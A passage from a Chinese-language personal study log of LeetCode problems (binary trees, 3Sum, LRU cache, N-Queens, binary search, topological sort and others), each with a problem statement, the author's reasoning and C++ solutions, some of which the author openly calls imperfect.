if(root==NULL)return;\n           dfs(root->left);\n           dfs(root->right);\n           cout<<root->val;\n       }\n   ```\n\n\n\n### 思路\n\n首先明确我们需要求的是什么，根据题目得到，我们要求最大路径和，该路径每个节点只能出现一次，而二叉树我们对于一个节点，只有算它的左节点和右节点最方便，根据题意这条路径就两种情况：\n\n+ 第一种：以某个节点为根节点往两边延申；\n+ 第二种：以某个节点为根节点只往一边延伸；\n\n得到这两种情况就好写代码很多，我们可以通过**存储节点单项向下延申的最大值**，因为对于某个根节点，如果要往两边延申，则往下延申的每个节点都只能往一边延申，而如果该根节点只往一边延伸，则往下延伸的每个节点也只能往一边延申，所以我们不需要存储该根节点往两边延伸的结果，因为后面都用不到，只需要在计算该根节点往一边延伸的最大值时顺便计算往两边延伸的最大值。\n\n单边延伸的最大值：\n\n```c++\nroot->val=max(max(root->left->val,root->right->val),0)+root->val;\n```\n\n由于我们是从下往上计算的单边延伸的最大值，所以用了后序遍历\n\n### 代码\n\n```c++\nclass Solution {\npublic:\n    int maxNum=-1001;\n    void maxPathForANode(TreeNode* root){\n        if(root->left==NULL||root->right==NULL){\n            if(root->left!=NULL||root->right!=NULL){\n                if(root->left==NULL)root->val=root->val+max(0,root->right->val);\n                if(root->right==NULL)root->val=root->val+max(0,root->left->val);\n            }\n        }else{\n            maxNum=max(root->left->val+root->right->val+root->val,maxNum);\n            root->val=max(max(root->left->val,root->right->val),0)+root->val;      \n        }\n        maxNum=max(root->val,maxNum);\n\n    }\n    void dfs(TreeNode*root){\n        if(root==NULL)return;\n        dfs(root->left);\n        dfs(root->right);\n        maxPathForANode(root);\n    }\n    int maxPathSum(TreeNode* root) {\n        dfs(root);\n        return maxNum;\n    }\n};\n```\n\n## 验证二叉搜索树(中等)\n\n### 题目描述\n\n给你一个二叉树的根节点 `root` ，判断其是否是一个有效的二叉搜索树。\n\n**有效** 二叉搜索树定义如下：\n\n- 节点的左子树只包含 **小于** 当前节点的数。\n- 节点的右子树只包含 **大于** 当前节点的数。\n- 所有左子树和右子树自身必须也是二叉搜索树。\n\n \n\n**示例 1：**\n\n![img](2023-8-29%E4%BB%8A%E6%97%A5%E7%BB%83%E4%B9%A0/tree1.jpg)\n\n```\n输入：root = [2,1,3]\n输出：true\n```\n\n### 知识点\n\n1. long long最大值\n\n   ```c++\n   long long maxnum=LLONG_MAX;\n   ```\n\n### 思路\n\n这个题我们要考虑两个要点，下面我对这两个要点分别进行说明\n\n1. 对于一个节点，需保证左节点小于该节点，右节点大于该节点；\n\n   这个很好实现，用前序遍历的方式，遍历每个节点，判断是否满足左节点小于该节点，右节点大于该节点\n\n   ```c++\n   bool isValidBST(TreeNode*root){\n       if(root==NULL||(root->left==NULL&&root->right==NULL))return true;\n           if(root->left==NULL){\n               if(root->val>=root->right->val)return false;\n               return isValidBST(root->right);\n           }else if(root->right==NULL){\n               if(root->val<=root->left->val)return false;\n               return isValidBST(root->left);\n           }else{\n               if(root->val>=root->right->val||root->val<=root->left->val)return false;\n               return isValidBST(root->left)&&isValidBST(root->right);\n           }\n   }\n   ```\n\n   \n\n2. 对于一个节点，需保证左子树的所有值要大于右子树的所有值；\n\n   这对于每个节点就需要另外的两个值，该节点需要大于的值，和该节点需要小于的值，例如，某根节点的左子节点A的右子节点B，就需要保证B的值小于根节点的值，大于A的值\n\n   遍历方式也很简单，增加传入的参数，一个是要大于的值，一个是要小于的值，如果当前遍历节点为A，如果下一个遍历的是左节点，更新的方式是将要小于的值改成A的值，要大于的值不变，如果下一个遍历的是右节点，将要大于的值改成A的值，要小于的值不变\n\n### 代码\n\n```c++\nclass Solution {\npublic:\n    bool isValidBSTForANode(TreeNode*root,long long maxnum,long long minnum){\n        if(root->val<=maxnum||root->val>=minnum)return false;\n        return ((root->left==NULL)?true:isValidBSTForANode(root->left,maxnum,root->val))&&((root->right==NULL)?true:isValidBSTForANode(root->right,root->val,minnum));\n    }\n    bool isValidBST(TreeNode* root) {\n        return isValidBSTForANode(root,LLONG_MIN,LLONG_MAX);\n    }\n};\n```\n\n## 三数之和（中等）\n\n### 题目描述\n\n给你一个整数数组 `nums` ，判断是否存在三元组 `[nums[i], nums[j], nums[k]]` 满足 `i != j`、`i != k` 且 `j != k` ，同时还满足 `nums[i] + nums[j] + nums[k] == 0` 。请\n\n你返回所有和为 `0` 且不重复的三元组。\n\n**注意：**答案中不可以包含重复的三元组。\n\n**示例 1：**\n\n```\n输入：nums = [-1,0,1,2,-1,-4]\n输出：[[-1,-1,2],[-1,0,1]]\n解释：\nnums[0] + nums[1] + nums[2] = (-1) + 0 + 1 = 0 。\nnums[1] + nums[2] + nums[4] = 0 + 1 + (-1) = 0 。\nnums[0] + nums[3] + nums[4] = (-1) + 2 + (-1) = 0 。\n不同的三元组是 [-1,0,1] 和 [-1,-1,2] 。\n注意，输出的顺序和三元组的顺序并不重要。\n```\n\n### 思路\n\n好难/(ㄒoㄒ)/~~\n\n主要就是不可以包含重复的三元组比较难满足，如果直接三次遍历不仅有可能有重复的三元组而且复杂度很高，现在考虑的就是降低复杂度，同时不要有重复的三元组\n\n可以对原数组进行排序，这样能保证相同的数出现的地方是连续的，方便进行跳过\n\n先对第一个数进行遍历，然后第二个数初始化为第一个数后面那个数，第三个数初始化为最后一个数，也就是最大的数，如果三个加起来比0大，第三个数就往前走，有相同的就跳过，一个数只算一次，如果加起来比0小，第二个数就往后走\n\n### 代码\n\n```c++\nclass Solution {\npublic:\n    vector<vector<int>> threeSum(vector<int>& nums) {\n        sort(nums.begin(),nums.end());\n        vector<vector<int>>ans;\n        int second;\n        int third;\n        int length=nums.size();\n        for(int i=0;i<length;i++){\n            while(i!=0&&i<length&&nums[i]==nums[i-1])i++;\n            second=i+1;\n            third=length-1;\n            while(second<third){\n                while(second<third&&((second!=i+1&&nums[second]==nums[second-1])||nums[second]+nums[third]+nums[i]<0)) second++;\n                while(second<third&&((third!=length-1&&nums[third]==nums[third+1])||nums[second]+nums[third]+nums[i]>0)) third--;\n                if(second<third&&nums[second]+nums[third]+nums[i]==0) ans.push_back({nums[i],nums[second++],nums[third--]});\n            }   \n        }\n        return ans;\n    }\n};\n```\n\n## LRU缓存（中等）\n\n### 题目描述\n\n请你设计并实现一个满足 [LRU (最近最少使用) 缓存](https://baike.baidu.com/item/LRU) 约束的数据结构。\n\n实现 `LRUCache` 类：\n\n- `LRUCache(int capacity)` 以 **正整数** 作为容量 `capacity` 初始化 LRU 缓存\n- `int get(int key)` 如果关键字 `key` 存在于缓存中，则返回关键字的值，否则返回 `-1` 。\n- `void put(int key, int value)` 如果关键字 `key` 已经存在，则变更其数据值 `value` ；如果不存在，则向缓存中插入该组 `key-value` 。如果插入操作导致关键字数量超过 `capacity` ，则应该 **逐出** 最久未使用的关键字。\n\n函数 `get` 和 `put` 必须以 `O(1)` 的平均时间复杂度运行。\n\n**示例：**\n\n```\n输入\n[\"LRUCache\", \"put\", \"put\", \"get\", \"put\", \"get\", \"put\", \"get\", \"get\", \"get\"]\n[[2], [1, 1], [2, 2], [1], [3, 3], [2], [4, 4], [1], [3], [4]]\n输出\n[null, null, null, 1, null, -1, null, -1, 3, 4]\n\n解释\nLRUCache lRUCache = new LRUCache(2);\nlRUCache.put(1, 1); // 缓存是 {1=1}\nlRUCache.put(2, 2); // 缓存是 {1=1, 2=2}\nlRUCache.get(1);    // 返回 1\nlRUCache.put(3, 3); // 该操作会使得关键字 2 作废，缓存是 {1=1, 3=3}\nlRUCache.get(2);    // 返回 -1 (未找到)\nlRUCache.put(4, 4); // 该操作会使得关键字 1 作废，缓存是 {4=4, 3=3}\nlRUCache.get(1);    // 返回 -1 (未找到)\nlRUCache.get(3);    // 返回 3\nlRUCache.get(4);    // 返回 4\n```\n\n### 思路\n\n最近最少使用，lz仔细回忆了下os讲的内容，大概记得当时讲的是每个值会记录最近使用的时间，每次取的时候取最近使用时间最远的一次，所以我在此处也用了该思路，用了两个排序哈希（好像复杂度不满足要求？）\n\n### 代码\n\n```c++\nclass LRUCache {\npublic:\n    int i=0;\n    map<int,int>useTime;\n    map<int,vector<int>>word;\n    int capacityUse;\n    LRUCache(int capacity) {\n        capacityUse=capacity;\n    }\n    int get(int key) {\n        if(word.find(key)==word.end())return -1;\n        useTime.erase(word[key][1]);\n        word[key][1]=++i;\n        useTime[i]=key;\n        return word[key][0];\n    }\n    void put(int key, int value) {\n        i++;\n        if(word.find(key)!=word.end()){\n            useTime.erase(word[key][1]);\n            word[key][0]=value;\n            word[key][1]=i;   \n        }else{\n            if(word.size()==capacityUse){\n                word.erase(useTime.begin()->second);\n                useTime.erase(useTime.begin()->first);\n            }\n            word[key].push_back(value);\n            word[key].push_back(i);\n        }   \n        useTime[i]=key; \n    }\n};\n\n/**\n * Your LRUCache object will be instantiated and called as such:\n * LRUCache* obj = new LRUCache(capacity);\n * int param_1 = obj->get(key);\n * obj->put(key,value);\n */\n```\n\n## 从前序和中序遍历序列构造二叉树（中等）\n\n### 题目描述\n\n给定两个整数数组 `preorder` 和 `inorder` ，其中 `preorder` 是二叉树的**先序遍历**， `inorder` 是同一棵树的**中序遍历**，请构造二叉树并返回其根节点。\n\n \n\n**示例 1:**\n\n![img](2023-8-29%E4%BB%8A%E6%97%A5%E7%BB%83%E4%B9%A0/tree.jpg)\n\n```\n输入: preorder = [3,9,20,15,7], inorder = [9,3,15,20,7]\n输出: [3,9,20,null,null,15,7]\n```\n\n### 思路\n\n首先明确前序序列第一个肯定是该数组表示的树的根节点，然后再inorder里面找对应的位置，该位置之前的肯定是树的左子树的中序遍历结果，之后的肯定是树的右子树中序遍历结果，同时提取出前序序列中表示左子树前序遍历结果，和右子树前序遍历结果，进行递归处理避免重复操作\n\n### 代码\n\n```c++\nclass Solution {\npublic:\n    TreeNode* buildTree(vector<int> preorder, vector<int> inorder) {\n        if (preorder.empty() || inorder.empty()) return nullptr;\n        TreeNode* root = new TreeNode(preorder[0]);\n        for (int i = 0; i < inorder.size(); i++) {\n            if (inorder[i] == root->val) {\n                root->left = buildTree(vector<int>(preorder.begin() + 1, preorder.begin() + i + 1), vector<int>(inorder.begin(), inorder.begin() + i));\n                root->right = buildTree(vector<int>(preorder.begin() + i + 1, preorder.end()),vector<int>(inorder.begin() + i + 1, inorder.end()));\n            return root;\n            }\n        }\n        return root;\n    }\n};\n\n```\n\n## 搜索二维矩阵（中等）\n\n### 题目描述\n\n编写一个高效的算法来搜索 `*m* x *n*` 矩阵 `matrix` 中的一个目标值 `target` 。该矩阵具有以下特性：\n\n- 每行的元素从左到右升序排列。\n- 每列的元素从上到下升序排列。\n\n**示例 1：**\n\n![img](2023-8-29%E4%BB%8A%E6%97%A5%E7%BB%83%E4%B9%A0/searchgrid2.jpg)\n\n```\n输入：matrix = [[1,4,7,11,15],[2,5,8,12,19],[3,6,9,16,22],[10,13,14,17,24],[18,21,23,26,30]], target = 5\n输出：true\n```\n\n### 思路(两种思路)\n\n#### 思路一：二分查找\n\n先纵向遍历，只遍历比target小的，然后对那一排进行二分查找\n\n#### 代码一\n\n```c++\nclass Solution {\npublic:\n    bool searchMatrix(vector<vector<int>>& matrix, int target) {\n        int m=matrix.size();\n        int n=matrix[0].size()-1;\n        int left;\n        int right;\n        int mid;\n        for(int i=0;i<m;i++){\n            if(matrix[i][0]<=target&&matrix[i].back()>=target){   \n                left=0;\n                right=n;\n                while(left<right-1){\n                    mid=(left+right)/2;\n                    (matrix[i][mid]>=target)?right=mid:left=mid;\n                }\n                if(matrix[i][left]==target||matrix[i][right]==target)return true;\n            }\n            if(matrix[i][0]>target)return false;\n        }\n        return false;\n    }\n};\n```\n\n#### 思路二：Z字形查找\n\n从左下角开始，如果值比target大就往上，因为只有往上才能找到比该值小的数，如果比target小就往下\n\n#### 代码二\n\n```c++\nclass Solution {\npublic:\n    bool searchMatrix(vector<vector<int>>& matrix, int target) {\n        int n=matrix[0].size();\n        int x=matrix.size()-1;\n        int y=0;\n        while(x>=0&&y<n){\n            if(matrix[x][y]==target)return true;\n            (matrix[x][y]>target)?x--:y++;\n        }\n        return false;\n    }\n};\n```\n\n## N皇后（困难）\n\n### 题目描述\n\n按照国际象棋的规则，皇后可以攻击与之处在同一行或同一列或同一斜线上的棋子。\n\n**n 皇后问题** 研究的是如何将 `n` 个皇后放置在 `n×n` 的棋盘上，并且使皇后彼此之间不能相互攻击。\n\n给你一个整数 `n` ，返回所有不同的 **n 皇后问题** 的解决方案。\n\n每一种解法包含一个不同的 **n 皇后问题** 的棋子放置方案，该方案中 `'Q'` 和 `'.'` 分别代表了皇后和空位。\n\n**示例 1：**\n\n![img](2023-8-29%E4%BB%8A%E6%97%A5%E7%BB%83%E4%B9%A0/queens.jpg)\n\n```\n输入：n = 4\n输出：[[\".Q..\",\"...Q\",\"Q...\",\"..Q.\"],[\"..Q.\",\"Q...\",\"...Q\",\".Q..\"]]\n解释：如上图所示，4 皇后问题存在两个不同的解法。\n```\n\n### 思路\n\n用回溯的方法做，一排一排的放置皇后，一排只能放一个，同时为了方便确认哪些位置不能放，用了三个哈希来存不能放的位置:\n\n+ 第一个哈希用来存放过的列，这个只需要在要放新元素的时候添加值即可\n+ 第二个哈希用来放向右对角线延展的位置，因为题目要求了放了皇后的对角线位置不能放，由于可以向两边扩展对角线，所以这里用了两个哈希，同时每一排都需要更新，因为根据对角线不能放的列每一排是不一样的，往右扩展的要减一，往左扩展的要加一\n+ 第三个哈希用来放向左对角线延展的位置\n\n### 代码\n\n```c++\nclass Solution {\nprivate:\n    int count=0;\n    vector<vector<string>>ans;\npublic:\n    void putQueens(vector<string>ansItem,unordered_map<int,int>hash,unordered_map<int,int>hashForleft,unordered_map<int,int>hashForRight,int remainN,int n){\n        if(remainN==0){\n            ans.push_back(ansItem);\n            count++;\n            return;\n        }\n        unordered_map<int,int>hashForleftUse;\n        unordered_map<int,int>hashForRightUse;\n        for(auto it=hashForleft.begin();it!=hashForleft.end();it++){\n            hashForleftUse[it->first-1]=1;\n        }\n        for(auto it=hashForRight.begin();it!=hashForRight.end();it++){\n            hashForRightUse[it->first+1]=1;\n        }\n        string ansStr;\n        string ansStrCopy;\n        for(int i=0;i<n;i++){\n            if(hash.find(i)==hash.end()&&hashForleft.find(i)==hashForleft.end()&&hashForRight.find(i)==hashForRight.end()){\n                ansStrCopy=ansStr;\n                ansStrCopy.push_back('Q');\n                hash[i]=1;\n                hashForleftUse[i-1]=1;\n                hashForRightUse[i+1]=1;\n                for(int j=i+1;j<n;j++){\n                    ansStrCopy.push_back('.');\n                }\n                ansItem.push_back(ansStrCopy);\n                putQueens(ansItem,hash,hashForleftUse,hashForRightUse,--remainN,n);\n                hash.erase(i);\n                hashForleftUse.erase(i-1);\n                hashForRightUse.erase(i+1);\n                remainN++;\n                ansItem.pop_back();\n            }\n            ansStr.push_back('.');\n        }\n    }\n    vector<vector<string>> solveNQueens(int n) {\n        unordered_map<int,int>hash;\n        unordered_map<int,int>hashForleft;\n        unordered_map<int,int>hashForRight;\n        int remainN=n;\n        vector<string>ansItem;\n        putQueens(ansItem,hash,hashForleft,hashForRight,remainN,n);\n        return ans;\n    }\n};\n```\n\n## [在排序数组中查找元素的第一个和最后一个位置](https://leetcode.cn/problems/find-first-and-last-position-of-element-in-sorted-array/)(中等)\n\n### 题目描述\n\n给你一个按照非递减顺序排列的整数数组 `nums`，和一个目标值 `target`。请你找出给定目标值在数组中的开始位置和结束位置。\n\n如果数组中不存在目标值 `target`，返回 `[-1, -1]`。\n\n你必须设计并实现时间复杂度为 `O(log n)` 的算法解决此问题。\n\n**示例 1：**\n\n```\n输入：nums = [5,7,7,8,8,10], target = 8\n输出：[3,4]\n```\n\n**示例 2：**\n\n```\n输入：nums = [5,7,7,8,8,10], target = 6\n输出：[-1,-1]\n```\n\n**示例 3：**\n\n```\n输入：nums = [], target = 0\n输出：[-1,-1]\n```\n\n### 思路\n\n两遍二分查找即可，第一次找左边界，第二次找右边界\n\n### 代码\n\n```c++\nclass Solution {\npublic:\n\t\n    vector<int> searchRange(vector<int> nums, int target) {\n        int left=0;\n        int right=nums.size()-1;\n        if(right<0)return{-1,-1};\n        int mid;\n        while(left<right-1){\n            mid=(left+right)/2;\n            if(nums[mid]>=target)right=mid;\n            else left=mid;\n        }\n        int leftnum=-1;\n        int rightnum=-1;\n        if(nums[right]==target)leftnum=right;\n        if(nums[left]==target)leftnum=left;\n        left=0;\n        right=nums.size()-1;\n        while(left<right-1){\n            mid=(left+right)/2;\n            if(nums[mid]>target)right=mid;\n            else left=mid;\n        }\n        if(nums[left]==target)rightnum=left;\n        if(nums[right]==target)rightnum=right;\n        return {leftnum,rightnum};\n    }\n};\n\n```\n\n## 爬楼梯（简单）\n\n### 题目描述\n\n假设你正在爬楼梯。需要 `n` 阶你才能到达楼顶。\n\n每次你可以爬 `1` 或 `2` 个台阶。你有多少种不同的方法可以爬到楼顶呢？\n\n**示例 1：**\n\n```\n输入：n = 2\n输出：2\n解释：有两种方法可以爬到楼顶。\n1. 1 阶 + 1 阶\n2. 2 阶\n```\n\n### 思路\n\n一次只能爬两级或者一级，那爬到第i级的总方法次数为爬到i-2级然后再爬一级加上爬到i-1级然后再爬一级\n\n### 代码\n\n```c++\nclass Solution {\npublic:\n    int climbStairs(int n) {\n        vector<int>ans(n+1,0);\n        ans[0]=1;\n        ans[1]=1;\n        for(int i=2;i<n+1;i++){\n            ans[i]=ans[i-2]+ans[i-1];\n        }\n        return ans[n];\n    }\n};\n```\n\n## 完全平方数（中等）\n\n### 题目描述\n\n给你一个整数 `n` ，返回 *和为 `n` 的完全平方数的最少数量* 。\n\n**完全平方数** 是一个整数，其值等于另一个整数的平方；换句话说，其值等于一个整数自乘的积。例如，`1`、`4`、`9` 和 `16` 都是完全平方数，而 `3` 和 `11` 不是。\n\n**示例 1：**\n\n```\n输入：n = 12\n输出：3 \n解释：12 = 4 + 4 + 4\n```\n\n**示例 2：**\n\n```\n输入：n = 13\n输出：2\n解释：13 = 4 + 9\n```\n\n### 知识点\n\n1. c++对数开方并往下取整\n\n   ```c++\n   int sqrtNum=sqrt(num)\n   ```\n\n### 思路\n\n很简单的动态规划,dp[i]表示第i个数的需要的最小的完全平方数,计算dp[i+1]时比较哪两个数加起来结果为i+1并且dp[j]+dp[i+1-j]值最小即需要的最小的完全平方数\n\n### 代码\n\n```c++\nclass Solution {\npublic:\n    int numSquares(int n) {\n        unordered_map<int,int>dp;\n        for(int i=1;i<=n;i++){\n            dp[i]=10000;\n            for(int j=1;j<=sqrt(i);j++){\n                dp[i]=min(1+dp[i-j*j],dp[i]);\n            }\n        }\n        return dp[n];\n    }\n};\n```\n\n## 二叉树的直径（简单）\n\n### 题目描述\n\n给你一棵二叉树的根节点，返回该树的 **直径** 。\n\n二叉树的 **直径** 是指树中任意两个节点之间最长路径的 **长度** 。这条路径可能经过也可能不经过根节点 `root` 。\n\n两节点之间路径的 **长度** 由它们之间边数表示。\n\n**示例 1：**\n\n![img](2023-8-29%E4%BB%8A%E6%97%A5%E7%BB%83%E4%B9%A0/diamtree.jpg)\n\n```\n输入：root = [1,2,3,4,5]\n输出：3\n解释：3 ，取路径 [4,2,1,3] 或 [5,2,1,3] 的长度。\n```\n\n### 思路\n\n之前应该做过一个很类似的题，还是用遍历加改变节点值的方法。\n\n首先明确怎么确定这个最大路径，很简单可以思考到，这个最大路径肯定有一个'根节点'，这个根节点不一定是原二叉树的根节点，意思是从该根节点往左右节点延申到叶子节点得到的路径肯定是最长的路径，因为如果没有这个根节点，只算一边肯定不能是最大路径，因为还可以往另一边延申，如果不到叶子节点肯定也不对，因为还可以向下走，就不能算最大路径。\n\nlz最开始的思路是用前序遍历，从根节点遍历每一个节点，算每个节点左右子树的最大高度之和就是从该根节点能达到的最大路径，但是这种方式我们每次都要重新遍历节点，每次都要重新算从某个节点往下延伸的最大高度，这样上一次算出来的最大路径在后面也不能用，所以考虑使用后序遍历的方式，先遍历最下面的，然后将算出来的高度作为节点的值，这样上面一个节点的最大路径就是左节点的高度加上右节点的高度，由于我们是从下往上算的，就不需要重复算，直接读我们存的值就可以了。\n\n### 代码\n\n```c++\nclass Solution {\nprivate:\n    int maxNum;\npublic:\n    void dfs(TreeNode* root){\n        if(root==NULL)return;\n        dfs(root->left);\n        dfs(root->right);\n        if(root->left==NULL&&root->right==NULL){\n            root->val=0;\n        }else if(root->left==NULL){\n            root->val=root->right->val+1;\n            maxNum=max(maxNum,root->val);\n        }else if(root->right==NULL){\n            root->val=root->left->val+1;\n            maxNum=max(maxNum,root->val);\n        }else{\n            root->val=max(root->left->val,root->right->val)+1;\n            maxNum=max(maxNum,root->left->val+root->right->val+2);\n        }\n    }\n    int diameterOfBinaryTree(TreeNode* root) {\n        dfs(root);\n        return maxNum;\n    }\n};\n```\n\n## 将有序数组转换为二叉搜索树（简单）\n\n### 题目描述\n\n给你一个整数数组 `nums` ，其中元素已经按 **升序** 排列，请你将其转换为一棵 **高度平衡** 二叉搜索树。\n\n**高度平衡** 二叉树是一棵满足「每个节点的左右两个子树的高度差的绝对值不超过 1 」的二叉树。\n\n**示例 1：**\n\n![img](2023-8-29%E4%BB%8A%E6%97%A5%E7%BB%83%E4%B9%A0/btree1.jpg)\n\n```\n输入：nums = [-10,-3,0,5,9]\n输出：[0,-3,9,-10,null,5]\n解释：[0,-10,5,null,-3,null,9] 也将被视为正确答案：\n```\n\n### 知识点\n\n1. vecotor重定义大小：\n\n   ```c++\n   vector<int>nums;\n   nums.push_back(10);\n   nums.push_back(2);\n   nums.push_back(0);\n   nums.push_back(-1);\n   nums.push_bacn(-2);\n   vector<int>a1(nums.begin(),nums.begin()+2);//{10,2}\n   vector<int>a2(nums.begin()+2,nums.end());//{0,-1,-2}\n   ```\n\n### 思路\n\n要使两边高度差小于等于1，并保证每层如此，直接将中间值作为根节点即可，每层都如此，这样能保证两边差只有1或者0\n\n### 代码\n\n```c++\nclass Solution {\npublic:\n    TreeNode* sortedArrayToBST(vector<int> nums) {\n        if(nums.size()==0)return NULL;\n        TreeNode*newNode=new TreeNode();\n        newNode->val=nums[(nums.size()-1)/2];\n        newNode->left=sortedArrayToBST(vector<int>(nums.begin(),nums.begin()+(nums.size()-1)/2));\n        newNode->right=sortedArrayToBST(vector<int>(nums.begin()+(nums.size()-1)/2+1,nums.end()));\n        return newNode;\n    }\n};\n```\n\n## 环形链表（中等）\n\n### 题目描述\n\n给定一个链表的头节点  `head` ，返回链表开始入环的第一个节点。 *如果链表无环，则返回 `null`。*\n\n如果链表中有某个节点，可以通过连续跟踪 `next` 指针再次到达，则链表中存在环。 为了表示给定链表中的环，评测系统内部使用整数 `pos` 来表示链表尾连接到链表中的位置（**索引从 0 开始**）。如果 `pos` 是 `-1`，则在该链表中没有环。**注意：`pos` 不作为参数进行传递**，仅仅是为了标识链表的实际情况。\n\n**不允许修改** 链表。\n\n**示例 1：**\n\n![img](2023-8-29%E4%BB%8A%E6%97%A5%E7%BB%83%E4%B9%A0/circularlinkedlist.png)\n\n```\n输入：head = [3,2,0,-4], pos = 1\n输出：返回索引为 1 的链表节点\n解释：链表中有一个环，其尾部连接到第二个节点。\n```\n\n### 思路\n\n好吧，做完了才发现不能修改链表，还在想怎么这么简单，不修改链表的方法lz有空再做吧/(ㄒoㄒ)/~~\n\n### 代码\n\n```c++\nclass Solution {\npublic:\n    ListNode *detectCycle(ListNode *head) {\n        while(head&&head->val<INT_MAX){\n            head->val=INT_MAX;\n            head=head->next;\n        }\n        return head;\n    }\n};\n```\n\n## 翻转二叉树（简单）\n\n### 题目描述\n\n给你一棵二叉树的根节点 `root` ，翻转这棵二叉树，并返回其根节点。\n\n**示例 1：**\n\n![img](2023-8-29%E4%BB%8A%E6%97%A5%E7%BB%83%E4%B9%A0/invert1-tree.jpg)\n\n```\n输入：root = [4,2,7,1,3,6,9]\n输出：[4,7,2,9,6,3,1]\n```\n\n### 思路\n\n很简单的遍历，如下代码\n\n### 代码\n\n```c++\nclass Solution {\npublic:\n    TreeNode* invertTree(TreeNode* root) {\n        if(root==NULL)return NULL;\n        swap(root->left,root->right);\n        invertTree(root->left);\n        invertTree(root->right);\n        return root;\n    }\n};\n```\n\n## 数组中第k个最大的元素(中等)（待做）\n\n### 题目描述\n\n给定整数数组 `nums` 和整数 `k`，请返回数组中第 `**k**` 个最大的元素。\n\n请注意，你需要找的是数组排序后的第 `k` 个最大的元素，而不是第 `k` 个不同的元素。\n\n你必须设计并实现时间复杂度为 `O(n)` 的算法解决此问题。\n\n**示例 1:**\n\n```\n输入: [3,2,1,5,6,4], k = 2\n输出: 5\n```\n\n**示例 2:**\n\n```\n输入: [3,2,3,1,2,4,5,5,6], k = 4\n输出: 4\n```\n\n### 思路：大根堆\n\n## 课程表（中等）\n\n### 题目描述\n\n你这个学期必须选修 `numCourses` 门课程，记为 `0` 到 `numCourses - 1` 。\n\n在选修某些课程之前需要一些先修课程。 先修课程按数组 `prerequisites` 给出，其中 `prerequisites[i] = [ai, bi]` ，表示如果要学习课程 `ai` 则 **必须** 先学习课程 `bi` 。\n\n- 例如，先修课程对 `[0, 1]` 表示：想要学习课程 `0` ，你需要先完成课程 `1` 。\n\n请你判断是否可能完成所有课程的学习？如果可以，返回 `true` ；否则，返回 `false` 。\n\n**示例 1：**\n\n```\n输入：numCourses = 2, prerequisites = [[1,0]]\n输出：true\n解释：总共有 2 门课程。学习课程 1 之前，你需要完成课程 0 。这是可能的。\n```\n\n**示例 2：**\n\n```\n输入：numCourses = 2, prerequisites = [[1,0],[0,1]]\n输出：false\n解释：总共有 2 门课程。学习课程 1 之前，你需要先完成课程 0 ；并且学习课程 0 之前，你还应先完成课程 1 。这是不可能的。\n```\n\n### 知识点\n\n1. unordered_map合并\n\n   ```c++\n       unordered_map<int, int> map1 = {{1, 10}, {2, 20}, {3, 30}};\n       unordered_map<int, int> map2 = {{1, 40}, {5, 50}, {6, 60}};\n       map1.insert(map2.begin(), map2.end());\n   ```\n\n### 思路\n\n拓扑排序，思路就是，想象一张有向图，a->b代表完成a之后才能完成b，我们的目的就是不能在这张图中找到环\n\n一种方法是深度优先遍历，该方法的含义首先确定一个起始节点，对其指向的节点进行深度遍历，直到遍历到没有指向的点，就说明该点课程完成之后并不能对其他课程起作用，就将该课程标记为优先级最低的那一批，也可以理解为进栈，这里的优先级最低代表该课程不会对后面进栈的所有课程起作用，但是后面进栈的课程完成之后该课程才能完成，同时遍历还有一个重要判断条件就是一个节点在一条路上不能遍历两次，否这里也比较好理解，就是我们由于是深度遍历，所以每次相当于是遍历一条路径，如果这条路径有节点遍历了两次则就说明有环，所以每遍历一条路径就需要对这条路径进行标记，这里是标记为1，同时对已经判定第优先级的节点标记为2，就相当于这条路径不会再继续往下走了，该节点也不会用了，但是该节点之前的节点还需要用，因为是深度遍历\n\n广度优先遍历看了题解就懒得写代码了直接讲一下思路吧：还是一样的图，同时为每个节点记录入度，代表有几门课程修完之后该课程才能修，首先找到0度的节点，说明该节点可以直接修，然后从该节点进行广度优先遍历第一层，将连接的节点度数减一，相当于就是当作上一个节点直接修过了，然后在找度数为0的点继续广度优先遍历\n\n### 代码\n\n```c++\nclass Solution {\nprivate:\n    vector<vector<int>> edges;\n    vector<int> visited;\n    bool valid = true;\npublic:\n    void dfs(int i){\n        if(!valid)return;\n        visited[i]=1;\n        for(int item:edges[i]){\n            if(visited[item]==0){\n                dfs(item);\n            }else if(visited[item]==1){\n                valid=false;\n                return;\n            }\n        }\n        visited[i]=2;\n    } \n    bool canFinish(int numCourses, vector<vector<int>>& prerequisites) {\n        edges.resize(numCourses);\n        visited.resize(numCourses);\n        for(auto its : prerequisites)edges[its[1]].push_back(its[0]);\n        for(int i=0;i<numCourses;i++)if(!visited[i])dfs(i);\n        return valid;\n    }\n};\n```\n\n## 分割等和子集（中等）（待做）\n\n### 题目描述\n\n给你一个 **只包含正整数** 的 **非空** 数组 `nums` 。请你判断是否可以将这个数组分割成两个子集，使得两个子集的元素和相等。\n\n**示例 1：**\n\n```\n输入：nums = [1,5,11,5]\n输出：true\n解释：数组可以分割成 [1, 5, 5] 和 [11] 。\n```\n\n**示例 2：**\n\n```\n输入：nums = [1,2,3,5]\n输出：false\n解释：数组不能分割成两个元素和相等的子集。\n```\n\n### 知识点\n\n1. 数组求和\n\n## 每日温度（中等）\n\n### 题目描述\n\n给定一个整数数组 `temperatures` ，表示每天的温度，返回一个数组 `answer` ，其中 `answer[i]` 是指对于第 `i` 天，下一个更高温度出现在几天后。如果气温在这之后都不会升高，请在该位置用 `0` 来代替。\n\n**示例 1:**\n\n```\n输入: temperatures = [73,74,75,71,69,72,76,73]\n输出: [1,1,4,2,1,1,0,0]\n```\n\n**示例 2:**\n\n```\n输入: temperatures = [30,40,50,60]\n输出: [1,1,1,0]\n```\n\n**示例 3:**\n\n```\n输入: temperatures = [30,60,90]\n输出: [1,1,0]\n```\n\n### 思路\n\n不知道为什么最近做题一点思路都没有，这么经典的栈题都没做出来/(ㄒoㄒ)/~~\n\n很经典的用栈，因为要获取往后最近的比该点大的位置，开始想到了当遇到比自己小的数，就从那个数往后进行判断直到遇到比自己的大的数，但是没想起用栈/(ㄒoㄒ)/~~\n\n### 代码\n\n```c++\nclass Solution {\npublic:\n    vector<int> dailyTemperatures(vector<int> temperatures) {\n        vector<int>ans(temperatures.size());\n        stack<vector<int>>temper;\n        for(int i=0;i<temperatures.size();i++){\n            while(!temper.empty()&&temper.top()[0]<temperatures[i]){\n                ans[temper.top()[1]]=i-temper.top()[1];\n                temper.pop();\n            }\n            temper.push({temperatures[i],i});\n        }\n        while(!temper.empty()){\n            ans[temper.top()[1]]=0;\n            temper.pop();\n        }\n        return ans;\n    }\n};\n```\n\n## 划分字母区间（中等）\n\n### 题目描述\n\n给你一个字符串 `s` 